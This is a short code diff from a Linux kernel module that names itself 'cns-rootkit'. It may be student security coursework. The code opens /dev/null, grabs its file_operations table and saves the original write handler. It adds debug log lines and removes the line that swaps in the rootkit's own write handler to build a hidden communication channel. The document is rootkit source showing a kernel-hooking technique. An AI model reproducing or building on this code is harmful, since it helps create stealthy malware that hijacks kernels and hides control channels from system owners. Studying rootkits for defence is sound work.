@@ -22,13 +22,12 @@ int establish_comm_channel(void) {
   if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
     return -1;
   }
-
+  printk(KERN_INFO "cns-rootkit: Opened /dev/null for reading\n");
   struct file_operations *dev_null_fop;
   dev_null_fop = (struct file_operations *) dev_null_file->f_op;
   filp_close(dev_null_file, 0);
-
+  printk(KERN_INFO "cns-rootkit: Got file_operations structure and closed /dev/null\n");
   original_dev_null_write = dev_null_fop->write;
-  dev_null_fop->write = cns_rootkit_dev_null_write;
 
   printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
   return 0;
